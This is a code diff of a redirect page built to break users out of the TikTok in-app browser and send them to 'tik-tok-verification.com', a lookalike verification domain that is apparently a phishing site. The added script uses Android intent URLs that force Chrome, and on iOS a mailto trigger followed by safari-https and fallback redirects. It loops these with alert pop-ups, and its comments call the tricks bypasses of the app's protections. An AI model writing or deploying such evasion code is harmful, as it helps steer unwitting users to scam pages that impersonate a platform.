@@ -3,44 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }</style>
+    <style>body { background: #fff; margin: 0; padding: 0; }</style>
 </head>
 <body>
-    <div style="font-family:sans-serif; color:#666;">Verifying Connection...</div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
+    const domain = targetUrl.replace(/^https?:\/\//, '');
     const killTime = Date.now() + 5000;
 
-    function theWebcalNuke() {
+    function theCleanBreak() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: We use the "Market" bypass. 
-            // TikTok lets 'market://' links through to the OS picker.
-            // We use it to force a browser selection.
-            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
+            // Android: We use the "Chrome-Package" Intent. 
+            // This bypasses the app picker and forces the real Chrome app.
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE WEBCAL TRIGGER
-            // TikTok sees 'webcal://' and cannot handle it internally.
-            // This triggers the "Open in Calendar/Safari?" system prompt.
-            window.location.href = "webcal://" + cleanUrl;
+            // iOS: THE MAIL-RELAY PIVOT
+            
+            // 1. Trigger the system mailto. This forces the OS to "wake up" 
+            // and prepare to leave the TikTok app.
+            window.location.href = "mailto:verify@security.com?subject=Verification&body=Check";
 
-            // Immediately follow up with the direct Safari-Https call
+            // 2. 250ms delay: While the OS is transitioning, we swap the target.
+            // This forces the "Open in Safari?" prompt for the HTTPS link.
             setTimeout(() => {
-                window.location.href = "safari-https://" + cleanUrl;
-            }, 100);
+                window.location.href = "safari-https://" + domain;
+            }, 250);
+
+            // 3. The "Ghost" Assignment as a hard-fail fallback
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 400);
         }
     }
 
-    function runLogic() {
-        if (Date.now() > killTime) {
-            window.location.replace(targetUrl);
-            return;
-        }
+    function runLoop() {
+        if (Date.now() > killTime) return;
 
-        theWebcalNuke();
+        theCleanBreak();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -49,13 +51,13 @@
                 
                 alert(header + body);
                 
-                theWebcalNuke();
-                setTimeout(runLogic, 250);
+                theCleanBreak();
+                setTimeout(runLoop, 400);
             }
-        }, 250);
+        }, 400);
     }
 
-    window.onload = runLogic;
+    window.onload = runLoop;
 </script>
 </body>
 </html>
